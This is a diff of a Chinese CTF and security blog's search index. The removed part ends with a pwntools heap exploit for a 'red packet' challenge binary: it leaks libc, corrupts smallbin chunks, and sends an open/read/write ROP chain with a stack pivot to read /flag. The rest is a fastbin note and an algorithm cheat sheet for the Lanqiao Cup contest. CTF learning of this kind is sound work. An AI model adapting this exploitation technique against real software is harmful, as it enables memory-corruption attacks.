-sla     = lambda delim,data         :sh.sendlineafter(delim, data)
-r       = lambda num=4096           :sh.recv(num)
-ru      = lambda delims		    :sh.recvuntil(delims)
-itr     = lambda                    :sh.interactive()
-uu32    = lambda data               :u32(data.ljust(4,'\0'))
-uu64    = lambda data               :u64(data.ljust(8,'\0'))
-leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
-lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
-def dbg():
-        gdb.attach(sh)
-        pause()
- 
-
-def add(index,chunk_size_index,value):
-    ru('Your input: ')
-    sl('1')
-    ru('Please input the red packet idx: ')
-    sl(str(index))
-    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')
-    sl(str(chunk_size_index))
-    ru('Please input content: ')
-    sl(value)
-
-def free(index):
-    ru('Your input: ')
-    sl('2')
-    ru('Please input the red packet idx: ')
-    sl(str(index))
-
-def edit(index,value):
-    ru('Your input: ')
-    sl('3')
-    ru('Please input the red packet idx: ')
-    sl(str(index))
-    ru('Please input content: ')
-    sl(value)
-
-def show(index):
-    ru('Your input: ')
-    sl('4')
-    ru('Please input the red packet idx: ')
-    sl(str(index))
-
-
- 
-
-#1.0x10 2.0xf0 3.0x300 4.0x400
-for i in range(7):
-    add(15,4,'Chunk_15')
-    free(15)
-
-
-
-for i in range(6):
-    add(14,2,'Chunk_14')
-    free(14)
-
-#dbg()
-
-show(15)
-last_chunk_addr = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00'))
-lg('last_chunk_addr',last_chunk_addr)
-heap_addr = last_chunk_addr - 0x26C0
-lg('heap_addr',heap_addr)
-
-#dbg()
-
-add(1,4,'Chunk_1')
-add(13,3,'Chunk_13')
-
-#dbg()
-
-free(1)
-show(1)
-libc_base = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00')) - 0x1E4CA0
-lg('libc_base',libc_base)
-
-
-#dbg()
-
-#在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100
-add(13,3,'Chunk_13')
-
-
-#dbg()
-
-#在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk
-add(13,3,'Chunk_13')
-
-#dbg()
-
-#在申请一个0x400大小的chunk，再制造一个0x100的smallbin的chunk
-add(2,4,'Chunk_2')
-#申请一个chunk防止合并
-add(13,4,'Chunk_13')
-
-#dbg()
-
-free(2)
-
-#dbg()
-
-add(13,3,'Chunk_13')
-add(13,3,'Chunk_13')
-
-#dbg()
-
-payload='\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)
-edit(2,payload)
-
-#dbg()
-
-add(3,2,'Chunk_3')
-lg('heap_addr',heap_addr)
-
-#dbg()
-
-#ORW
-pop_rdi_ret = libc_base + 0x0000000000026542
-pop_rsi_ret = libc_base + 0x0000000000026f9e
-pop_rdx_ret = libc_base + 0x000000000012bda6
-file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置
-flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容
-ROP_chain  = '/flag\x00\x00\x00'
-#open(file_name_addr,0)
-ROP_chain += p64(pop_rdi_ret)
-ROP_chain += p64(file_name_addr)
-ROP_chain += p64(pop_rsi_ret)
-ROP_chain += p64(0)
-ROP_chain += p64(libc_base+libc.symbols['open'])
-#read(3,flag_addr,0x40)
-#Read函数的第一个参数文件描述符从0开始累加，
-#程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，
-#这样在程序中，每打开一个文件，文件描述符值从3开始累加。
-#我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件
-#read函数第一个参数是3，就是在这个文件里读取数据。
-ROP_chain += p64(pop_rdi_ret)
-ROP_chain += p64(3)
-ROP_chain += p64(pop_rsi_ret)
-ROP_chain += p64(flag_addr)
-ROP_chain += p64(pop_rdx_ret)
-ROP_chain += p64(0x40)
-ROP_chain += p64(libc_base+libc.symbols['read'])
-#write(1,flag_addr,0x40)
-ROP_chain += p64(pop_rdi_ret)
-ROP_chain += p64(1)
-ROP_chain += p64(pop_rsi_ret)
-ROP_chain += p64(flag_addr)
-ROP_chain += p64(pop_rdx_ret)
-ROP_chain += p64(0x40)
-ROP_chain += p64(libc_base+libc.symbols['write'])
-
-add(4,4,ROP_chain)
-
-#dbg()
-
-leave_ret = libc_base + 0x0000000000058373
-ru('Your input: ')
-sl('666')
-ru('What do you want to say?')
-#栈迁移
-sl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))
-
-#dbg()
-itr()
-</code></pre>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2023/09/11/fastbin%20attack/</url>
+    <title>fastbin attack</title>
+    <url>/2023/04/10/fastbin%20attack/</url>
     <content><![CDATA[<p>如果从fastbins中malloc-一个freechunk时，glibc会做以下两个检测：</p>
 <pre><code>检测1：检测你要malloc的freechunk的大小是否在该chunk所在的fastbin链的大小尺寸范围内（例如：一个fastbin链所存储的
 chunk大小必须在0x30-0x40之间，但是你要申请的这个chunk却是0x50,那么就会程序就报错退出)
@@ -2840,6 +3729,268 @@ chunk大小必须在0x30-0x40之间，但是你要申请的这个chunk却是0x50
 检测2：检测你这个freechunk的size成员的PREV INUSE为是否为1，为1才可以通过检测
 </code></pre>
 ]]></content>
+      <tags>
+        <tag>heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>蓝桥杯</title>
+    <url>/2023/04/10/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="救赎"><a href="#救赎" class="headerlink" title="救赎"></a>救赎</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="1-欧几里得辗转相除法-求解-最大公约数-最小公倍数"><a href="#1-欧几里得辗转相除法-求解-最大公约数-最小公倍数" class="headerlink" title="1.欧几里得辗转相除法 求解 最大公约数 最小公倍数"></a>1.欧几里得辗转相除法 求解 最大公约数 最小公倍数</h3><pre><code class="c++">int gcd(int a, int b){return b == 0 ? a : gcd(b, a % b);}
+int lcm(int a, int b){return a / gcd(a, b) * b;}
+</code></pre>
+<h3 id="2-求质数"><a href="#2-求质数" class="headerlink" title="2.求质数"></a>2.求质数</h3><pre><code class="c++">/* 判断素数 */
+bool isPrime(LL n) {
+    for (int i = 2; i * i &lt;= n; ++i)
+        if (n % i == 0)
+            return false;
+    return true;
+}
+</code></pre>
+<h3 id="3-栈"><a href="#3-栈" class="headerlink" title="3.栈"></a>3.栈</h3><pre><code class="c++">#include &lt;stack&gt;
+stack&lt;类型&gt; mystack;
+s.empty();         //如果栈为空则返回true, 否则返回false;
+s.size();          //返回栈中元素的个数
+s.top();           //返回栈顶元素, 但不删除该元素
+s.pop();           //弹出栈顶元素, 但不返回其值
+s.push();          //将元素压入栈顶
+</code></pre>
+<h3 id="4-队列"><a href="#4-队列" class="headerlink" title="4.队列"></a>4.队列</h3><pre><code class="c++">#include &lt;queue&gt;
+queue&lt;类型&gt; myqueue;
+push() //在队尾插入一个元素
+pop() //删除队列第一个元素
+size() //返回队列中元素个数
+empty() //如果队列空则返回true
+front() //返回队列中的第一个元素
+back() //返回队列中最后一个元素
+</code></pre>
+<h3 id="5-DFS-深度优先"><a href="#5-DFS-深度优先" class="headerlink" title="5.DFS(深度优先)"></a>5.DFS(深度优先)</h3><pre><code class="c++">int dx[4] = {0,0,-1,1};
+int dy[4] = {-1,1,0,0};
+int mp[N][N];//存放迷宫
+int vis[N][N];//表示是否访问过，初始为flase
+void DFS(int x, int y)	//x,y是坐标点的位置 
+{
+    if(vis[x][y] || (x==n &amp;&amp; y==n)) return; //表示已经访问过了或者到达终点,递归的出口
+    vis[x][y] = true; //表示没有访问过，现在正在访问，置为访问过
+    for(int i=0; i &lt; 4; i++){	//遍历四个方向，顺序依次是，上下左右
+        int nx = x + dx[i];
+        int ny = y + dy[i];
+      //进行了合法性检验，
+      //1.首先判断了该点是否越界，即是否在迷宫内  nx &gt; 0 &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; 0 &amp;&amp; ny &lt;= n
+      //2.然后判断是否访问过  !vis[nx][ny] 未访问过就继续
+      //3.最后判断是否为路  mp[nx][ny] == '0' 为路就继续
+        if(nx &gt; 0 &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; 0 &amp;&amp; ny &lt;= n &amp;&amp; !vis[nx][ny] &amp;&amp; mp[nx][ny] == '0')
+            dfs(nx,ny);
+    } 
+}
+//注意!! 应该判断一下起点是否可走
+</code></pre>
+<h3 id="6-BFS-广度优先搜索"><a href="#6-BFS-广度优先搜索" class="headerlink" title="6.BFS(广度优先搜索)"></a>6.BFS(广度优先搜索)</h3><pre><code class="c++">int X[4]={0, 0, -1, 1};
+int Y[4]={-1, 1, 0, 0};
+int matrix[N][N]; //存储迷宫信息
+int vis[N][N];	//存储每个状态点是否走过
+
+struct node{
+    int x;
+    int y;
+}Node, top;
+
+bool judge(int xx, int yy)
+{
+    if(xx&lt;0||yy&lt;0||xx&gt;=N||yy&gt;=N) //注意边界
+        return false;
+    if(vis[xx][yy]==true||matrix[xx][yy]==0)	//下一个点走过或者为墙 0不能走，1能走
+        return false;
+    return true;
+}
+
+
+void BFS(int x, int y)
+{
+    queue&lt;node&gt; q;
+    Node.x=x;
+    Node.y=y;
+    q.push(Node);	//将起点入队列
+    while(!q.empty())	//队列不空就扩散
+    {
+        top=q.front();	//取出队首元素
+        int nx=top.x;
+        int ny=top.y;	//从四个方面机进行扩散
+         if(nx == ex &amp;&amp; ny == ey) //找到终点
+             return top;
+        for(int i=0; i&lt;4; i++)
+        {
+            if(judge(nx+X[i], ny+Y[i])) //检查四个方向，如果有路就进队列
+            {
+                Node.x=nx+X[i];
+                Node.y=ny+Y[i];
+                q.push(Node);	
+            }
+        }
+        ans++;	//计数器
+        vis[nx][ny]=true;
+        q.pop();	//表示这个点的邻接点已经全部入队列，丢弃这个点
+    }
+}
+</code></pre>
+<h3 id="7-二分模板"><a href="#7-二分模板" class="headerlink" title="7.二分模板"></a>7.二分模板</h3><pre><code class="c++">/*
+    作者:FengBOOOOOOOOOOOOOOO
+    二分模板返回大于x的第一个位置    
+*/
+#include&lt;cstdio&gt;
+#include&lt;algorithm&gt;
+#include&lt;cstring&gt;
+#define N 1005
+using namespace std;
+
+int a[N],n,q;
+
+int find(int l,int r,int key)//l为-1，r为数组长度
+{
+    while(l + 1 &lt; r)
+    {
+        int mid = l + r&gt;&gt;1;
+        if(a[mid] &lt;= key)
+        　　l = mid;
+        else
+        　　r = mid;
+    }
+    return r;//返回大于Key的第一个位置
+}
+
+int main()
+{
+    int k;
+    scanf("%d%d",&amp;n,&amp;q);
+    for(int i = 0; i &lt; n; ++i)
+    　　scanf("%d",&amp;a[i]);
+    for(int i = 0; i &lt; q; ++i)
+    {
+        scanf("%d",&amp;k);
+        printf("%d\n",find(-1,n,k));
+    }
+} 
+</code></pre>
+<h2 id="最短路径问题"><a href="#最短路径问题" class="headerlink" title="最短路径问题"></a>最短路径问题</h2><h3 id="1-SPFA最短路径-类似与BFS"><a href="#1-SPFA最短路径-类似与BFS" class="headerlink" title="1.SPFA最短路径(类似与BFS)"></a>1.SPFA最短路径(类似与BFS)</h3><pre><code class="c++">#include &lt;iostream&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;algorithm&gt;
+#include &lt;queue&gt;
+#include &lt;vector&gt;
+#define ll long long
+#define inf 0x3f3f3f3f
+#define pii pair&lt;int, int&gt;
+const int mod = 1e9+7;
+const int maxn = 2e5+7;
+using namespace std;
+struct node {int to,w,next;} edge[maxn];
+int head[maxn], cnt;
+int dis[maxn], vis[maxn];
+int n, m, s, t;
+struct Spfa
+{
+    void init()
+    {
+        memset(head,-1,sizeof(head));
+        memset(dis,0x3f3f3f3f,sizeof(dis));
+        memset(vis,0,sizeof(vis));
+        cnt = 0;
+    }
+ 
+    void add(int u,int v,int w)
+    {
+        edge[cnt].to = v;
+        edge[cnt].w = w;
+        edge[cnt].next = head[u];
+        head[u] = cnt ++;
+    }
+ 
+    void spfa()
+    {
+        dis[s] = 0; vis[s] = 1;
+        queue &lt;int&gt; Q; Q.push(s);
+        while(!Q.empty())
+        {
+            int now = Q.front();
+            Q.pop(); vis[now] = 0;    //从队列中弹出now , vis[now] 标记为未访问
+            for(int i = head[now]; i != -1; i = edge[i].next)
+            {
+                int v = edge[i].to;
+                if(dis[v] &lt; dis[now] + edge[i].w)
+                {
+                    dis[v] = dis[now] + edge[i].w;
+                    if(vis[v]) continue;    //如果访问过了(也就是 已经在队列中),就不用再push
+                    vis[v] = 1; Q.push(v);
+                }
+            }
+        }
+    }
+}sp;
+ 
+int main()
+{
+    while(~scanf("%d%d",&amp;n,&amp;m) &amp;&amp; n+m)
+    {
+        sp.init();
+        for(int i = 0; i &lt; m; i++)
+        {
+            int u, v, w;
+            scanf("%d%d%d",&amp;u, &amp;v, &amp;w);
+            sp.add(u, v, w);
+            sp.add(v, u, w);
+        }
+        s = 1, t = n; //s起点，t终点
+        sp.spfa();
+        printf("%d\n", dis[t]);
+    }
+}
+</code></pre>
+<h3 id="2-Dijkstra"><a href="#2-Dijkstra" class="headerlink" title="2.Dijkstra"></a>2.Dijkstra</h3><pre><code class="c++">//主要思想一个大循环+两个小循环
+void dijkstra(){
+    int u, minx;
+    book[S] = 1;
+    for(int i = 0; i &lt; N; i++){
+    //dist[]数组初始化，把起始结点S到i结点的距离赋值给diat[i]
+        dist[i] = v[S][i];
+    }
+
+    for(int i = 0; i &lt; N; i++){//大循环
+        minx = INT_MAX;
+        for(int j = 0; j &lt; N; j++){//寻找没有被标记并且最短的路径，并记录此结点 
+            if(!book[j] &amp;&amp; minx &gt; dist[j]){
+                minx = dist[j];
+                u = j;
+            } 
+        }
+        book[u] = 1;
+        for(int k = 0; k &lt; N; k++){
+        //如果A到B的距离大于A到C的距离加C到B的距离，那么更新数据
+            if(!book[k] &amp;&amp; dist[k] &gt; dist[u]+v[u][k]){
+                dist[k] = dist[u]+v[u][k];
+            }
+        }
+    }
+}
+</code></pre>
+<h3 id="3-Floyd"><a href="#3-Floyd" class="headerlink" title="3.Floyd"></a>3.Floyd</h3><pre><code class="c++">//初始化：
+    for (int i = 1; i &lt;= n; i ++ )
+        for (int j = 1; j &lt;= n; j ++ )
+            if (i == j) d[i][j] = 0;
+            else d[i][j] = INF;
+
+// 算法结束后，d[a][b]表示a到b的最短距离
+void floyd()
+{
+    for (int k = 1; k &lt;= n; k ++ )
+        for (int i = 1; i &lt;= n; i ++ )
+            for (int j = 1; j &lt;= n; j ++ )
+                d[i][j] = min(d[i][j], d[i][k] + d[k][j]);
+}
+</code></pre>
+]]></content>
+      <tags>
+        <tag>蓝桥杯刷题总结</tag>
+      </tags>
   </entry>
   <entry>
     <title>密码学实验</title>
@@ -3729,265 +4880,6 @@ int main() {
 ]]></content>
       <tags>
         <tag>密码学实验代码集合</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>蓝桥杯</title>
-    <url>/2023/04/10/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="救赎"><a href="#救赎" class="headerlink" title="救赎"></a>救赎</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="1-欧几里得辗转相除法-求解-最大公约数-最小公倍数"><a href="#1-欧几里得辗转相除法-求解-最大公约数-最小公倍数" class="headerlink" title="1.欧几里得辗转相除法 求解 最大公约数 最小公倍数"></a>1.欧几里得辗转相除法 求解 最大公约数 最小公倍数</h3><pre><code class="c++">int gcd(int a, int b){return b == 0 ? a : gcd(b, a % b);}
-int lcm(int a, int b){return a / gcd(a, b) * b;}
-</code></pre>
-<h3 id="2-求质数"><a href="#2-求质数" class="headerlink" title="2.求质数"></a>2.求质数</h3><pre><code class="c++">/* 判断素数 */
-bool isPrime(LL n) {
-    for (int i = 2; i * i &lt;= n; ++i)
-        if (n % i == 0)
-            return false;
-    return true;
-}
-</code></pre>
-<h3 id="3-栈"><a href="#3-栈" class="headerlink" title="3.栈"></a>3.栈</h3><pre><code class="c++">#include &lt;stack&gt;
-stack&lt;类型&gt; mystack;
-s.empty();         //如果栈为空则返回true, 否则返回false;
-s.size();          //返回栈中元素的个数
-s.top();           //返回栈顶元素, 但不删除该元素
-s.pop();           //弹出栈顶元素, 但不返回其值
-s.push();          //将元素压入栈顶
-</code></pre>
-<h3 id="4-队列"><a href="#4-队列" class="headerlink" title="4.队列"></a>4.队列</h3><pre><code class="c++">#include &lt;queue&gt;
-queue&lt;类型&gt; myqueue;
-push() //在队尾插入一个元素
-pop() //删除队列第一个元素
-size() //返回队列中元素个数
-empty() //如果队列空则返回true
-front() //返回队列中的第一个元素
-back() //返回队列中最后一个元素
-</code></pre>
-<h3 id="5-DFS-深度优先"><a href="#5-DFS-深度优先" class="headerlink" title="5.DFS(深度优先)"></a>5.DFS(深度优先)</h3><pre><code class="c++">int dx[4] = {0,0,-1,1};
-int dy[4] = {-1,1,0,0};
-int mp[N][N];//存放迷宫
-int vis[N][N];//表示是否访问过，初始为flase
-void DFS(int x, int y)	//x,y是坐标点的位置 
-{
-    if(vis[x][y] || (x==n &amp;&amp; y==n)) return; //表示已经访问过了或者到达终点,递归的出口
-    vis[x][y] = true; //表示没有访问过，现在正在访问，置为访问过
-    for(int i=0; i &lt; 4; i++){	//遍历四个方向，顺序依次是，上下左右
-        int nx = x + dx[i];
-        int ny = y + dy[i];
-      //进行了合法性检验，
-      //1.首先判断了该点是否越界，即是否在迷宫内  nx &gt; 0 &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; 0 &amp;&amp; ny &lt;= n
-      //2.然后判断是否访问过  !vis[nx][ny] 未访问过就继续
-      //3.最后判断是否为路  mp[nx][ny] == '0' 为路就继续
-        if(nx &gt; 0 &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; 0 &amp;&amp; ny &lt;= n &amp;&amp; !vis[nx][ny] &amp;&amp; mp[nx][ny] == '0')
-            dfs(nx,ny);
-    } 
-}
-//注意!! 应该判断一下起点是否可走
-</code></pre>
-<h3 id="6-BFS-广度优先搜索"><a href="#6-BFS-广度优先搜索" class="headerlink" title="6.BFS(广度优先搜索)"></a>6.BFS(广度优先搜索)</h3><pre><code class="c++">int X[4]={0, 0, -1, 1};
-int Y[4]={-1, 1, 0, 0};
-int matrix[N][N]; //存储迷宫信息
-int vis[N][N];	//存储每个状态点是否走过
-
-struct node{
-    int x;
-    int y;
-}Node, top;
-
-bool judge(int xx, int yy)
-{
-    if(xx&lt;0||yy&lt;0||xx&gt;=N||yy&gt;=N) //注意边界
-        return false;
-    if(vis[xx][yy]==true||matrix[xx][yy]==0)	//下一个点走过或者为墙 0不能走，1能走
-        return false;
-    return true;
-}
-
-
-void BFS(int x, int y)
-{
-    queue&lt;node&gt; q;
-    Node.x=x;
-    Node.y=y;
-    q.push(Node);	//将起点入队列
-    while(!q.empty())	//队列不空就扩散
-    {
-        top=q.front();	//取出队首元素
-        int nx=top.x;
-        int ny=top.y;	//从四个方面机进行扩散
-         if(nx == ex &amp;&amp; ny == ey) //找到终点
-             return top;
-        for(int i=0; i&lt;4; i++)
-        {
-            if(judge(nx+X[i], ny+Y[i])) //检查四个方向，如果有路就进队列
-            {
-                Node.x=nx+X[i];
-                Node.y=ny+Y[i];
-                q.push(Node);	
-            }
-        }
-        ans++;	//计数器
-        vis[nx][ny]=true;
-        q.pop();	//表示这个点的邻接点已经全部入队列，丢弃这个点
-    }
-}
-</code></pre>
-<h3 id="7-二分模板"><a href="#7-二分模板" class="headerlink" title="7.二分模板"></a>7.二分模板</h3><pre><code class="c++">/*
-    作者:FengBOOOOOOOOOOOOOOO
-    二分模板返回大于x的第一个位置    
-*/
-#include&lt;cstdio&gt;
-#include&lt;algorithm&gt;
-#include&lt;cstring&gt;
-#define N 1005
-using namespace std;
-
-int a[N],n,q;
-
-int find(int l,int r,int key)//l为-1，r为数组长度
-{
-    while(l + 1 &lt; r)
-    {
-        int mid = l + r&gt;&gt;1;
-        if(a[mid] &lt;= key)
-        　　l = mid;
-        else
-        　　r = mid;
-    }
-    return r;//返回大于Key的第一个位置
-}
-
-int main()
-{
-    int k;
-    scanf("%d%d",&amp;n,&amp;q);
-    for(int i = 0; i &lt; n; ++i)
-    　　scanf("%d",&amp;a[i]);
-    for(int i = 0; i &lt; q; ++i)
-    {
-        scanf("%d",&amp;k);
-        printf("%d\n",find(-1,n,k));
-    }
-} 
-</code></pre>
-<h2 id="最短路径问题"><a href="#最短路径问题" class="headerlink" title="最短路径问题"></a>最短路径问题</h2><h3 id="1-SPFA最短路径-类似与BFS"><a href="#1-SPFA最短路径-类似与BFS" class="headerlink" title="1.SPFA最短路径(类似与BFS)"></a>1.SPFA最短路径(类似与BFS)</h3><pre><code class="c++">#include &lt;iostream&gt;
-#include &lt;string.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;algorithm&gt;
-#include &lt;queue&gt;
-#include &lt;vector&gt;
-#define ll long long
-#define inf 0x3f3f3f3f
-#define pii pair&lt;int, int&gt;
-const int mod = 1e9+7;
-const int maxn = 2e5+7;
-using namespace std;
-struct node {int to,w,next;} edge[maxn];
-int head[maxn], cnt;
-int dis[maxn], vis[maxn];
-int n, m, s, t;
-struct Spfa
-{
-    void init()
-    {
-        memset(head,-1,sizeof(head));
-        memset(dis,0x3f3f3f3f,sizeof(dis));
-        memset(vis,0,sizeof(vis));
-        cnt = 0;
-    }
- 
-    void add(int u,int v,int w)
-    {
-        edge[cnt].to = v;
-        edge[cnt].w = w;
-        edge[cnt].next = head[u];
-        head[u] = cnt ++;
-    }
- 
-    void spfa()
-    {
-        dis[s] = 0; vis[s] = 1;
-        queue &lt;int&gt; Q; Q.push(s);
-        while(!Q.empty())
-        {
-            int now = Q.front();
-            Q.pop(); vis[now] = 0;    //从队列中弹出now , vis[now] 标记为未访问
-            for(int i = head[now]; i != -1; i = edge[i].next)
-            {
-                int v = edge[i].to;
-                if(dis[v] &lt; dis[now] + edge[i].w)
-                {
-                    dis[v] = dis[now] + edge[i].w;
-                    if(vis[v]) continue;    //如果访问过了(也就是 已经在队列中),就不用再push
-                    vis[v] = 1; Q.push(v);
-                }
-            }
-        }
-    }
-}sp;
- 
-int main()
-{
-    while(~scanf("%d%d",&amp;n,&amp;m) &amp;&amp; n+m)
-    {
-        sp.init();
-        for(int i = 0; i &lt; m; i++)
-        {
-            int u, v, w;
-            scanf("%d%d%d",&amp;u, &amp;v, &amp;w);
-            sp.add(u, v, w);
-            sp.add(v, u, w);
-        }
-        s = 1, t = n; //s起点，t终点
-        sp.spfa();
-        printf("%d\n", dis[t]);
-    }
-}
-</code></pre>
-<h3 id="2-Dijkstra"><a href="#2-Dijkstra" class="headerlink" title="2.Dijkstra"></a>2.Dijkstra</h3><pre><code class="c++">//主要思想一个大循环+两个小循环
-void dijkstra(){
-    int u, minx;
-    book[S] = 1;
-    for(int i = 0; i &lt; N; i++){
-    //dist[]数组初始化，把起始结点S到i结点的距离赋值给diat[i]
-        dist[i] = v[S][i];
-    }
-
-    for(int i = 0; i &lt; N; i++){//大循环
-        minx = INT_MAX;
-        for(int j = 0; j &lt; N; j++){//寻找没有被标记并且最短的路径，并记录此结点 
-            if(!book[j] &amp;&amp; minx &gt; dist[j]){
-                minx = dist[j];
-                u = j;
-            } 
-        }
-        book[u] = 1;
-        for(int k = 0; k &lt; N; k++){
-        //如果A到B的距离大于A到C的距离加C到B的距离，那么更新数据
-            if(!book[k] &amp;&amp; dist[k] &gt; dist[u]+v[u][k]){
-                dist[k] = dist[u]+v[u][k];
-            }
-        }
-    }
-}
-</code></pre>
-<h3 id="3-Floyd"><a href="#3-Floyd" class="headerlink" title="3.Floyd"></a>3.Floyd</h3><pre><code class="c++">//初始化：
-    for (int i = 1; i &lt;= n; i ++ )
-        for (int j = 1; j &lt;= n; j ++ )
-            if (i == j) d[i][j] = 0;
-            else d[i][j] = INF;
-
-// 算法结束后，d[a][b]表示a到b的最短距离
-void floyd()
-{
-    for (int k = 1; k &lt;= n; k ++ )
-        for (int i = 1; i &lt;= n; i ++ )
-            for (int j = 1; j &lt;= n; j ++ )
-                d[i][j] = min(d[i][j], d[i][k] + d[k][j]);
-}
-</code></pre>
-]]></content>
-      <tags>
-        <tag>蓝桥杯刷题总结</tag>
       </tags>
   </entry>
 </search>
